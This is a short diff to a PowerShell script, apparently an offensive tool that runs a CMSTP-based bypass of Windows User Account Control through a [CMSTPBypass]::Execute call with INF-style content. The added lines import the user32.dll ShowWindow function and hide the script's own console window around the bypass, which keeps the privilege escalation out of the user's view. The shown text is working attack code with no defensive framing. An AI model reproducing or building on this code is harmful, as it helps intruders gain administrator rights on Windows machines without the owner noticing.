@@ -162,10 +162,40 @@ ShortSvcName=""CorpVPN""
 
 }
 "@
+function showwindow(){
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
 
+public class API {
+
+    public enum SW : int {
+        Hide            = 0,
+        Normal          = 1,
+        ShowMinimized   = 2,
+        Maximize        = 3,
+        ShowNoActivate  = 4,
+        Show            = 5,
+        Minimize        = 6,
+        ShowMinNoActive = 7,
+        ShowNA          = 8,
+        Restore         = 9,
+        Showdefault     = 10,
+        Forceminimize   = 11
+    }
+
+    [DllImport("user32.dll")]
+    public static extern int ShowWindow(IntPtr hwnd, SW nCmdShow);
+}
+'@
+}
 function Execute {
     try 
     {
+       $ThisWindow = [System.Diagnostics.Process]::GetCurrentProcess().MainwindowHandle
+       [API]::ShowWindow($ThisWindow,'Hide')
+       sleep -Seconds 5
+       [API]::ShowWindow($ThisWindow,'Show')
         $result = [CMSTPBypass]::Execute($final) 
     } 
     catch 
